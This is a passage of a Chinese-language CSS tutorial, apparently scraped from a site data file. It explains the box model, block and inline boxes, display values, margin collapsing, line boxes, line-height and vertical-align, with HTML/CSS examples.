此时子元素水平右边框距离父元素左内边距是10+111=121，而父元素水平右边框距离父元素左内边距是100+20=121，刚好多出1px，所以会有滚动条 */\n            height: 81px; /* 此时布局尺寸为81+10+10=101，比父级内容高度100多出1px，所以会有滚动条 */\n            background-color: blue;\n        }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# 6.5 text-overflow\n\ntext-overflow是一个文字溢出的属性，经常和overflow搭配使用，比如你的文本只要显示一行，多出的用省略号替代，那么就可以让overflow设置为hidden，text-overflow设置为ellipsis，最后别忘了对文本设置不换行white-space设置为nowrap。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            border: 1px solid #333333;\n            width: 200px;\n            white-space: nowrap;        /* 文本不换行 */\n            overflow: hidden;           /* 超出盒子时隐藏溢出内容 */\n            text-overflow: ellipsis;    /* 超出的文本末尾使用省略号替代 */\n        }\n    </style>\n</head>\n<body>\n    <div class="box">This box has a height and a width. </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n',normalizedContent:'# 盒模型\n\n\n# 一、盒子的构成与设置\n\n\n# 1.1 盒子的构成\n\n在css中，所有元素都是一个“盒子（box）”结构，这个盒子有一个盒边框，在这个边框内部有个显示内容区域，显示内容与边框之间还会有填充（内边距），边框与其他盒子之间也有间距（外边距）。可以看下面这个盒模型图：\n\n\n\n解释：\n\n * content area: 这个区域是用来显示内容，大小可以通过设置 width 和 height。\n * padding area: 包围在内容区域外部的空白区域； 大小通过 padding 相关属性设置。\n * border area: 边框盒包裹内容和内边距。大小通过 border 相关属性设置。\n * margin area: 这是最外面的区域，是盒子和其他元素之间的空白区域。大小通过 margin 相关属性设置。\n\n\n# 1.2 盒子的相关设置\n\n标准盒模型的width和height其实就是contentarea的宽高，但是ie盒模型的width和height是contentarea、paddingarea以及borderarea这三者的和值，通过改变box-sizing: content-box（w3c）和box-sizing: border-box（ie）就可以达到自由切换的效果。\n\nmargin可以统一设置上下左右的外边距，比如margin: 0 10px 20px 30px意思就是上外边距是0、右外边距是10px、下外边距是20px、左外边距是30px。也可以margin: 0 10px上下外边距是0、左右外边距是10px。单独设置一边也可以的，比如margin-top:0; margin-right:10px; margin-bottom:20px; margin-left:30px;，\n\nborder可以统一设置也可以单独设置一边。主要注意的是它还有其他样式可以设置，比如颜色border-color、宽度border-width、线条类型border-style。\n\npadding也可以统一设置也可以单独设置一边。padding只能是非负数；而margin可以是负数，并且可能会影响到自身的位置以及大小，在四、内外边距的影响会详细说明。\n\n<html>\n<head>\n    <style type="text/css">\n        .container {\n          border-top: 5px dotted green;\n          border-right: 1px solid black;\n          border-bottom: 10px double blue;\n        }\n        .box {\n          border: 1px solid #333333;\n          border-top-style: dotted;\n          border-right-width: 20px;\n          border-bottom-color: red;\n          margin: 20px 20px;\n        }\n    </style>\n</head>\n<body>\n    <div class="container">\n      <div class="box">change my borders.</div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n上面代码的效果图：\n\n\n# 二、块级盒子和内联盒子\n\n在水平书写模式中，页面通常是从左到右、从上到下这样一个顺序来显示元素的（阿拉伯语言等除外），盒子也是基于这种正常的元素排列顺序来说的。\n\ncss盒子最主要的两种盒子就是块级盒子（block box）和内联盒子（inline box），它们主要的区别就是在排列顺序上表现不一样。比如块级盒子主要是垂直排列（一个块级元素就默认占据一行），而内联盒子主要是水平排列（多个内联元素在一行里inline）。\n\n块级盒子会表现出以下行为:\n\n * 块级盒子默认会与父容器一样宽；\n * 每个块级盒子都会单独占一行，也就是说，不会有其他块级盒子和当前块级盒子在一行里；\n * width 和 height 属性可以发挥作用；\n * 内外边距和边框会将其他元素从当前盒子周围“推开”。\n\n内联盒子会表现出以下行为:\n\n * 内联盒子不会单独占一行，多个内联盒子可以在一行里（并且留了间隙，所以一般不用内联盒子）。\n * width 和 height 属性将不起作用，原因是它是由内部撑起来的。\n * 垂直方向的内外边距以及边框会被应用，虽然被应用了，但并不会推开上下的其他内联盒子（真要推开，也是靠行高来影响的）。\n * 水平方向的内外边距以及边框会被应用，并且会把左右的内联盒子推开。\n\n<html>\n<head>\n    <style type="text/css">\n        p {\n            width: 300px;\n            height: 150px;\n            border: 2px solid red;\n        }\n        span {\n            margin: 20px;   /* 外边距和边框虽然是生效的，垂直是推不开的其他内联元素的，而水平方向的可以 */\n            padding: 10px;  /* 生效 */\n            width: 30px;    /* 内联盒子忽略宽度 */\n            height: 10px;   /* 内联盒子忽略高度 */\n            background-color: lightblue;\n            border: 2px solid blue;\n        }\n    </style>\n</head>\n<body>\n    <p>\n        i am a paragraph and this is a <span>span</span> inside that paragraph. a span is an inline element and so does not respect width and height.\n    </p>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n上面代码的效果图：\n\n\n除非特殊指定，<h1>、<p>和<div>等在默认情况下都是块级盒子，<span>、<a>、<em>和<strong>等在默认情况下都是内联盒子。可以通过display来指定或者修改元素的盒子类型。\n\n<html>\n<head>\n    <style type="text/css">\n        div { display: inline; background-color: red; }\n        span { display: block; background-color: green; }\n    </style>\n</head>\n<body>\n    <div>div元素</div>\x3c!--变成在一行里排列的内联元素--\x3e\n    <div>div元素</div>\x3c!--变成在一行里排列的内联元素--\x3e\n    <span>span元素</span>\x3c!--变成占满一行的块级元素--\x3e\n    <span>span元素</span>\x3c!--变成占满一行的块级元素--\x3e\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 三、display的其他值\n\n\n# 3.1 none\n\ndisplay: none一般用于隐藏元素。它所在位置会被其他元素占领，不会留出空白。\n\n<html>\n<head>\n    <style type="text/css">\n        .none { display: none; }\n    </style>\n</head>\n<body>\n    <div>示例文本1</div>\n    <div class="none">示例文本2</div>\n    <div class="none">示例文本3</div>\n    <div>示例文本4</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 3.2 inline-block\n\n希望元素在一行里排列，并且还能设置宽高（块级特点），但又不想它因为内外边距的原因导致与其他元素在垂直方向上重叠（上一节的span例子，内联特点），那么可以采用display: inline-block结合块级和内联两种方式的优点来使用。说简单点就是在一行里排列块级元素，并且垂直方向的内外边距能推开其他内容。\n\n<html>\n<head>\n    <style type="text/css">\n        p {\n            width: 300px;\n            height: 150px;\n            border: 2px solid red;\n        }\n        span {\n            display: inline-block;\n            margin: 20px;   /* 会推开文字 */\n            padding: 10px;\n            width: 30px;    /* 生效 */\n            height: 10px;   /* 生效 */\n            background-color: lightblue;\n            border: 2px solid blue;\n        }\n    </style>\n</head>\n<body>\n    <p>\n    i am a paragraph and this is a <span>span</span> inside that paragraph. a span is an inline element and so does not respect width and height.\n</p>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n上面代码的效果图：\n\n\n# 3.3 inline-table\n\ninline-table与inline-block是类似的，只不过它是单独针对于<table>的。table元素是属于block类型的，使用display: inline-table可以让table元素在行内排列。\n\n<html>\n<head>\n    <style type="text/css">\n        table {\n            border: 2px solid blue;\n            margin: 30px;\n            display: inline-table;\n        }\n        td { border: 2px solid red; }\n    </style>\n</head>\n<body>\n    你好\n    <table>\n        <tr><td>a</td><td>a</td><tr/>\n        <tr><td>b</td><td>c</td><tr/>\n    </table>\n    你好\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 3.4 list-item\n\ndisplay: list-item可以将多个元素作为列表来显示。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            display: list-item;\n            list-style-type: circle;\n            margin-left:30px;\n        }\n    </style>\n</head>\n<body>\n    <div>文本1</div>\n    <div>文本2</div>\n    <div>文本3</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 3.5 run-in和compact\n\ndisplay: run-in的元素将被包含在后面的block类型元素的内部，而display: compact的元素将被放置在block类型元素的左边。在css2.1被删除了，在css3恢复了但是很多浏览器没有实现，了解一下就行了。\n\n\n# 四、内外边距的影响\n\n\n# 4.1 展示尺寸与布局尺寸\n\n我们看待一个元素，要从两方面去分析它的，一个是视觉上，另一个就是布局上的。\n\n首先在视觉上，元素给我们呈现的视觉大小是由contentarea、paddingarea和borderarea决定的。比如给元素加上background-color，这个颜色所占区域就是contentarea、paddingarea、borderarea加起来的总区域。\n\n看下面这个例子，宽高其实都是100px的div，第一个加了margin，第二个加了padding，第三个加了padding和border，实际给我们呈现的效果除了content以外就只有padding和border还会影响视觉大小，而margin根本不会影响元素的视觉大小。我们暂且将元素在视觉上的展示大小称为元素的展示尺寸，它的值等于border + padding + content这个和值。（是不是想起ie盒的width和height）\n\n<html>\n<head>\n    <style type="text/css">\n        div { width: 100px; height: 100px; }\n        .div1 { background-color: green; margin: 20px; }\n        .div2 { background-color: yellow; padding: 20px; }\n        .div3 { background-color: blue; padding: 20px; border: 2px solid red; }\n    </style>\n</head>\n<body>\n    <div class="div1"></div>\n    <div class="div2"></div>\n    <div class="div3"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n然后在布局上，contentarea、paddingarea、borderarea和marginarea会决定元素在正常布局流中占据的空间大小。\n\n还是上面这个例子。三个div左右的外边距都是顶着父容器左右边框的，那么内容加上左右填充再加上左右边框最后加上左右外边距，这个值就等于父容器内容的宽度，也就说三个div盒子占据的空间宽度相同（这是一个伏笔）。而他们的占据的空间高度呢？同样也是如此，内容加上上下填充再加上上下边框最后加上上下外边距，在数值上几乎是一样的（除了第三个div有上下边框，浏览器f12查看）。我们暂且将元素在布局流中占据的空间大小称为元素的布局尺寸，它的值等于margin + border + padding + content这个和值。\n\n看下面这个例子，将第一个div的margin-bottom从20px慢慢改变到-20px。在改变过程中，你会发现后面两个div会慢慢往上挪动，形成一种步步紧逼的样子。这个现象其实就是因为第一个div占据的空间慢慢变小（布局尺寸减小），多出的空间被后面的div占据了。然后你还会发现展示效果一直是102×102的矩形区域，只不过会发生重叠，布局尺寸的减少并不会导致展示效果被压缩，也就说展示尺寸和布局尺寸之间没有强关联，只是数值上相差margin值而已。\n\n<html>\n<head>\n    <style type="text/css">\n        div { width: 100px; height: 100px; border: 1px solid red; }\n        /* margin: 20px 20px 0 20px;中的第三个值从20px慢慢变到0再慢慢变到-20px */\n        .div1 { background-color: green; margin: 20px 20px 0 20px; }\n        .div2 { background-color: yellow; padding: 20px; opacity: 0.8; }\n        .div3 { background-color: blue; padding: 20px; }\n    </style>\n</head>\n<body>\n    <div class="div1"></div>\n    <div class="div2"></div>\n    <div class="div3"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n还有一个比较有意思的点，改变布局尺寸，展示效果位移的可能是自己也可能是下一个元素。如果改变的是元素在排列方向上靠前的外边距，那展示效果位移的就是自己；如果改变的是排列方向上靠后的外边距，那展示效果位移的就是下一个元素。看下面这个例子，将第二个div的margin-top慢慢从0变为-40px，你会发现下面两个div在慢慢向上挪动。如果是margin-bottom，那就只有最后一个div移动。\n\nps：排列方向，就是根据元素特性来排列（在正常布局流中），比如块级元素就是垂直方向（因为它们单独占一行，所以是进行上下的一个排列），内联元素就是水平方向。\n\n<html>\n<head>\n    <style type="text/css">\n        div { width: 100px; height: 100px; border: 1px solid red; }\n        .div1 { background-color: green; margin: 20px; }\n        .div2 { background-color: yellow; margin-top: -40px; padding: 20px; opacity: 0.8; }\n        .div3 { background-color: blue; padding: 20px; }\n    </style>\n</head>\n<body>\n    <div class="div1"></div>\n    <div class="div2"></div>\n    <div class="div3"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n我们一直没说内边距对布局尺寸的影响，其实很简单，就是内边距只能增大布局尺寸而不能减小布局尺寸，原因就是padding只能是正值。那么可以下结论了，内边距既能改变布局尺寸也能改变展示尺寸，而外边距一般只能改变布局尺寸。\n\n\n# 4.2 块级元素的隐藏等式\n\n你会看到上面的结论有“一般”这个词，因为有一种情况比较特殊，也是之前埋下的伏笔。块级元素在非排列方向上（也就是块级元素是水平方向上）的外边距，可能会影响到展示尺寸。\n\n因为块级元素有个特点，水平占据一行。什么意思呢？块级元素布局尺寸的宽度必须等于父元素内容的宽度，也就是这个等式margin-left + border-left-width + padding-left + width + padding-right + border-right-width + margin-right = the width of the parent element（准确来说是等于父容器内容的宽度，子元素水平方向的布局尺寸等于父元素的内容的宽度）。垂直方向是没有这个等式的，因为块级元素高度的auto是由本身内容决定的，块级元素宽度的auto是由父级宽度决定的。\n\n上一节的那些例子，父级元素宽度不变，子级元素有显示设置宽度、内边距以及边框，只需要左右外边距来补齐布局尺寸宽度即可。再看下面这个例子，没有设置子元素宽度（那就默认auto），并且让左右外边距取负值，要维持那个等式，那得让展示尺寸的宽度增大才行。当然左右外边距取正值也会影响到展示尺寸宽度（减小）。\n\n<html>\n<head>\n    <style type="text/css">\n    .outer { width: 150px; height: 75px; border: 2px solid green; margin: 25px; }\n    /* 宽度没有设置或者为auto，左右外边距取负值。 */\n    .inner { height: 25px; border: 1px solid red; margin-left: -20px}\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n由于这个等式的关系，只要让子元素的左右内外边距固定不变，父元素宽度变大，那子元素宽度跟着变大（父变小那子也变小）；或者父元素宽度固定，让子元素的左右内外边距变大，那子元素的宽度反而会变小（边距变小那子就变大）。我们常把这种子元素叫做自适应的盒子。\n\n<html>\n<head>\n    <style>\n        .outer {\n            width: 200px;\n            height: 200px;\n            background-color: red;\n            margin: 50px 0 0 100px;\n        }\n        .inner {\n            height: 100px;\n            background-color: blue;\n            /* 子元素宽度由margin来决定（父元素width固定），还应用了外边距取负数 */\n            margin: 50px -150px 0 -50px;\n        }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# 4.3 在内联元素上的表现\n\n前面两小节基本上说的是块级元素，讨论了块级元素在排列方向以及非排列方向上展示尺寸和布局尺寸的效果和作用。那么内联元素呢？\n\n内联元素在排列方向上（内联水平排列），跟块级元素在排列方向上（块级垂直排列）一样。展示尺寸和布局尺寸都是有效果作用也正常。\n\n但是内联元素在非排列方向上（也就是垂直方向），跟块级元素在非排列方向上（也就是水平方向）同样是受到限制的。展示尺寸没问题，该怎么展示就怎么展示，和块级元素在水平方向一样。只是布局尺寸就不一样，块级元素水平方向有一个关于布局尺寸的隐藏等式，内联元素垂直方向是没有这样的等式，而是有一个line box的限制。\n\nline box会限制相邻两行内联元素的内外边距影响，可以回想一下内联盒子的最后两条表现，上下左右的内外边距被应用，左右内外边距可以推开相邻内联盒子，而上下内外边距是推不开相邻内联盒子。\n\n其实内联元素具体是内联替换元素或者内联块级元素的时候，那布局尺寸的功能都开始生效了，不过还是相对于line box来说的，通过影响line box来间接影响到相邻两行。\n\n以上不明白的去看内联元素的排列，这里只是简单说一下。然后我们小节一下，在元素的“排列方向”上，展示尺寸和布局尺寸是正常工作的，在在元素的“非排列方向”上，展示尺寸仍正常工作，而布局尺寸会受到限制。\n\n\n# 4.4 上下外边距折叠\n\n在正常布局流中相邻块级元素的上下外边距有折叠。\n\n解释说明：\n\n * 正常布局流：块级盒子一般是垂直排列，内联盒子一般是水平排列，可以看后面的章节——正常布局流。\n * 相邻块级元素：也就是上下紧挨着的块级盒子（跟盒子大小无关，也肯定是各占一行）。\n * 上下外边距：其实是两个盒子之间相互靠近的外边距（各自出一个外边距）。\n * 折叠：取两个值中最大的那个作为最终值（同号，并且绝对值最大），那个小值会被忽略掉（可以理解为重叠）。与折叠相反的就是“累积”，意思是两个值相加。\n\n具体场景（第4个场景比较特殊）：\n\n 1. 两个相邻的块级盒子。它们之间的间隔当然只是上下的外边距起作用，如果两个相靠近的外边距同号（同时为正数或负数），那外边距是折叠的；而异号的话就是累积的。\n    \n    <html>\n    <head>\n        <style type="text/css">\n        .outer { display: inline-block; width: 150px; border: 2px solid green; padding: 25px; }\n        .inner { display: block; width: 150px; height: 75px; }\n        .left1 { margin-bottom: 10px; border: 1px solid red; } /* 可以试着改一下margin-bottom*/\n        .right1 { margin-top: 10px; border: 1px solid blue; }\n        .left2 { margin-bottom: -10px; border: 1px solid red; } /* 可以试着改一下margin-bottom*/\n        .right2 { margin-top: 10px; border: 1px solid blue; }\n        .left3 { margin-bottom: -10px; border: 1px solid red; } /* 可以试着改一下margin-bottom*/\n        .right3 { margin-top: -10px; border: 1px solid blue; }\n        </style>\n    </head>\n    <body>\n        <div class="outer">\n            <div class="inner left1"></div>\n            <div class="inner right1"></div>\n        </div>\n        <div class="outer">\n            <div class="inner left2"></div>\n            <div class="inner right2"></div>\n        </div>\n        <div class="outer">\n            <div class="inner left3"></div>\n            <div class="inner right3"></div>\n        </div>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    \n\n 2. 两个相邻的内联盒子。它们之间的间隔当然只是左右的外边距起作用，两个相靠近的外边距不管正负，都是累积的，也就说不会发生折叠。其他的具有内联性质的比如inline-block也是如此。然后垂直方向就不要考虑了，因为他们有line box隔离了相邻两行。\n    \n    <html>\n    <head>\n        <style type="text/css">\n        .outer { width: 200px; border: 2px solid green; padding: 25px; margin-bottom: 25px; }\n        .inner { display: inline; }\n        .left1 { margin-right: 10px; border: 1px solid red; } /* 可以试着改一下margin-right*/\n        .right1 { margin-left: 10px; border: 1px solid blue; }\n        .left2 { margin-right: -10px; border: 1px solid red; } /* 可以试着改一下margin-right*/\n        .right2 { margin-left: 10px; border: 1px solid blue; }\n        .left3 { margin-right: -10px; border: 1px solid red; } /* 可以试着改一下margin-right*/\n        .right3 { margin-left: -10px; border: 1px solid blue; }\n        </style>\n    </head>\n    <body>\n        <div class="outer">\n            <div class="inner left1">abcdef</div>\n            <div class="inner right1">ghijkl</div>\n        </div>\n        <div class="outer">\n            <div class="inner left2">abcdef</div>\n            <div class="inner right2">ghijkl</div>\n        </div>\n        <div class="outer">\n            <div class="inner left3">abcdef</div>\n            <div class="inner right3">ghijkl</div>\n        </div>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    \n\n 3. 四个相邻的浮动元素。相靠近的左右外边距是累积的，相靠近的上下外边距也是累积的，但是它可以在浮动规则下尽可能的往上靠。什么意思呢？元素都左浮动，上一行在左边比较“低”，而在右边比较“高”（活动空间比左边多），那么浮动元素宁愿将左边位置空出来都要去右边位置高的地方。\n    \n    <html>\n     <head>\n         <style type="text/css">\n         /*设置224的原因，2个宽度就是200，左右外边距最大是20，有4个1px的边界*/\n         .outer { display: flow-root; width: 224px; border: 2px solid green; padding: 25px; }\n         .inner { float: left; width: 100px; height: 20px;}\n         .cell1 { margin-right: 10px; margin-bottom: 10px; border: 1px solid red; }\n         .cell2 { margin-left: 10px; margin-bottom: -5px; height: 25px; border: 1px solid blue; }\n         .cell3 { margin-right: -10px; margin-top: -5px; margin-bottom: 0px; height: 25px; border: 1px solid red; }\n         .cell4 { margin-left: -10px; margin-top: 0px; margin-bottom: 0px; border: 1px solid blue; }\n         </style>\n     </head>\n     <body>\n         <div class="outer">\n             <div class="inner cell1">cell1</div>\n             <div class="inner cell2">cell2</div>\n             <div class="inner cell3">cell3</div>\n             <div class="inner cell4">cell4</div>\n         </div>\n     </body>\n     <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    \n\n 4. 两个块级元素嵌套，如果父级元素没有设置边框或者没有设置内边距或者没有其他内容将父子隔开，那么子级元素设置的上下外边距就会与父级的上下外边距进行折叠。除了改变父级的盒子设置，还可以将子元素改为内联块级元素，或者使用bfc，都可解决折叠问题。\n    \n     <html>\n     <head>\n         <style type="text/css">\n         .outer { width: 200px; margin: 5px; background-color: blue; }\n         .inner { height: 25px; border: 1px solid red; margin: 30px; }\n         </style>\n     </head>\n     <body>\n         <div class="outer">\n             <div class="inner">aaa</div>\n         </div>\n         \x3c!--先看上面这一个outer，父子的上下外边距是否折叠。然后再打开下面的注释，看两个同样的outer是否也折叠上下外边距--\x3e\n         \x3c!--<div class="outer">\n             <div class="inner">aaa</div>\n         </div>--\x3e\n     </body>\n     <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    \n\n其实不止相邻元素的上下外边距会有折叠，其实父子元素的上边距也可能会折叠。如果父元素没有边框，那么它们与顶部的距离就是父子上外边距里的最大值，并且父子上下之间是紧紧贴在一起的（也就是子元素的外边距不起作用了，原因是父元素没有边框，效果直接传递到父元素了）。比如父元素的上外边距是20px，子上外边距是50px，那么它们与顶部的距离就是50px。\n\n<html>\n<head>\n    <style>\n        .outer {\n            width: 200px;\n            height: 200px;\n            background-color: red;\n            margin: 20px 0 0 0;\n            /* 加上边框或者bfc就可以解决父子上外边距折叠问题 */\n            /*border: 1px  green solid;*/\n        }\n        .inner {\n            width: 100px;\n            height: 100px;\n            background-color: blue;\n            /* 左右外边距是正常的 */\n            margin: 50px 0 0 50px;\n        }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 五、内联元素的排列\n\n块级元素的排列还是很简单的，展示尺寸控制水平和垂直的展示效果，布局尺寸直接占满父级内容的一行（margin可取负数，情况稍微复杂点，上一节说过），而垂直方向上的布局尺寸就是正常表现了，没什么可说的，自己回顾上一节的内容。\n\n而内联元素的排列，在水平方向上展示尺寸和布局尺寸是正常表现，但是在垂直方向上元素的上下内外边距并不会推开其他内联元素，它有自己的一套展示规则。\n\n\n# 5.1 替换元素与非替换元素\n\n替换元素（replaced element）：元素本身是不具有内容的，但是可以由它的一些属性决定它的最终展示内容（比如src）。可以理解为元素本身的内容被替换掉了，或者说一些内容嵌入到了这个元素中。\n\n替换元素的特点：最终的展示内容可以提前通过width和height来控制，如果你没有使用这两个来控制大小，它的内容是具有一个原始尺寸，这个原始尺寸会成为最终的展示效果大小。\n\n非替换元素（nonreplaced element）：与替换元素相反，自己有内容也会成为最终的展示内容，不会被元素其他属性引来的内容所替换。\n\n<img>、<input>、<textarea>、<select>、<object>等是h5以前常见的替换元素，h5新增了<video>、<canvas>、<menu>等替换元素。其他大部分html元素是非替换元素。\n\n绝大部分替换元素是具有内联性质的，而又因为替换元素的内容具有原始尺寸的特点（意思是你具有内联性质却还能用width和height来控制），所以在后面讨论内联元素的排列时会拿内联非替换元素来说，而不是内联替换元素（也不会拿内联块级来说）。那么其实剩下的内联元素基本就是和文本有关的，讨论内联元素的排列时可以与下一章的内容（字体与文本属性）一起看。\n\n\n# 5.2 inline box和line box\n\n我们知道内联非替换元素在正常布局流上的排列，是从左到右（ltr），排满后换到下一行继续排列。如下概念图。\n\n\n\n回想一下内联元素的表现，最后两条“表现”的内在意思是什么？其实就是，视觉效果依旧，布局在水平上依旧但垂直方向上无效了。四周的contentarea + paddingarea + borderarea仍旧影响到内联元素的展示效果，并且contentarea + 左右paddingarea + 左右borderarea + 左右marginarea可以推开（左右）相邻的内联元素（左右外边距取负值还能拉近），而contentarea + 上下paddingarea + 上下borderarea + 上下marginarea却不会推开（上下）相邻的内联元素（上下外边距取负值也不能拉近）。搞不明白的去看布局尺寸与展示尺寸。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent {\n            font-size: 20px;\n            line-height: 20px;\n            width: 280px;\n            border: 1px solid;\n            margin: 0;\n        }\n        /* 上下视觉效果（contentare+paddingarea+borderarea）还是有的，左右可以推开，上下却不行*/\n        /* 然后padding改为margin，视觉效果回到了contentare（因为padding没了），左右可以推开，上下却不行*/\n        span { padding: 50px 30px; background-color: red; opacity: 0.7; }\n    </style>\n</head>\n<body>\n    <div class="parent">this is text, this is text, this is text, <span>this is text,</span> this is text.</div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n上下推不开的原因是每一行都有一个line box，是一整行的实际渲染区域。如下概念图。因为不可能让一行所有内联非替换元素的padding和margin等，都去影响相邻行的内联非替换元素，引入line box可以让相邻行以整行的形式相互影响。line box这个概念非常像块级元素，占据一行。区别还是蛮大的，相邻行的line box紧挨着的，并没有什么内外边距和边界；不能设置固定宽高，它的宽高是由内部所有的内联元素共同决定的。\n\n\n\nline box隔绝了相邻行里内联非替换元素之间的影响，内联非替换元素对line box也是不会使用margin进行什么推开和拉近的。因为内联非替换元素有自己的inline box，并且有vertical-align和line-height来决定内联非替换元素在垂直方向上的摆放。inline box是内联元素的渲染区域，inline box的高度在大部分情况下就是该内联元素的line-height的值。（内联替换元素或者内联块级元素时，inline box的高度是布局尺寸高度。）\n\n\n\ninline box与line box的关系：line box包含了一行所有的inline box。一行中最高的inline box的顶部会构成line box的顶部，一行中最低的inline box的底部会构成line box的底部。如下图，稍微严谨一点的图了。\n\n\n\n\n# 5.3 line-height和baseline\n\n因为在前面说过“不可能让一行所有内联非替换元素的padding和margin等都去影响相邻行的内联非替换元素”，所以引进了line box。但是行与行之间，或者说文字之间的上下空隙总得有，不然会不美观。所以有了行高line-height，它主要是给内联非替换元素开辟垂直空间的，也就是决定了内联非替换元素的inline box高度（然后间接影响到line box的高度）。\n\n内联非替换元素的内容常见的就是文字，font-size会决定文字的显示高度（它是一个影响因素），css会让line-height减去font-size，再将得到的值也就是leading平分为两半，一半放在文字的上方，一半放在文字的下方。如果line-height没有显式设置，那浏览器会给个默认值（1.2或1.4等等，具体看浏览器了）。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent {\n            font-size: 20px;\n            line-height: 20px; /* 值改为10px、20px、40px试试 */\n            width: 200px;\n            border: 1px solid;\n        }\n    </style>\n</head>\n<body>\n    <div class="parent">this is text, this is text, this is text.</div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n当遇到复杂场景时，比如一行的文字大小不一或者内联非替换元素内容高低不一，它们在垂直方向上应该是怎样摆放的？我们来介绍最基本也是css默认的一种方式——baseline对齐。baseline（基线）是用于在上面放置字符的一条假象的基准线，在英文字体中，baseline通常是小写字母x的底部边缘（其他字符可能有下沉，比如g和p等等），如下图。其实汉字与另外一些文字是其实没有基线概念的，但在css中还是让它们按照英文的基线对齐的（也可以使用vertical-align其他值）。\n\n\n\n我们看下面这个例子。xx的font-size从20px增大到80px，xx一直在基线上，而xx的inline box上移了。原因是字体的中心（line-height的中心）与xx基线的距离越来越远。\n\n<html>\n<head>\n    <style type="text/css">\n    .parent {\n        font-family: arial ;\n        font-size: 20px;\n        line-height: 40px;\n        width: 600px;\n        border: 1px solid;\n    }\n    /* 将font-size从20px变为80px */\n    .text2 { font-size: 20px; }\n    /* 以下是调试代码 */\n    .parent { position: relative; }\n    .parent span::after {\n        content: \'\';\n        position: absolute;\n        border: 1px solid red;\n        box-sizing: border-box;\n    }\n    .text1::after { bottom: 0; left: 0; width: 94px; height: 40px; }\n    .text2::after { top: 0; left: 94px; width: 85px; height: 40px; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <span class="text1">expensive</span> <span class="text2">xx</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n\n# 5.4 vertical-align\n\nvertical-align是内联非替换元素的垂直对齐方式，默认值是baseline也就是上一小节说的基线对齐。它还有其他值，sub | super | top | text-top | middle | bottom | text-bottom | <length> | <percentage>。\n\nvertical-align: baseline：垂直对齐方式的默认值。让子元素的baseline与父元素内部的baseline对齐，更具体点是子元素的baseline会与它当前所在行的baseline对齐。\n\n一行里所有使用baseline对齐方式的内联非替换元素，这些元素的baseline与line 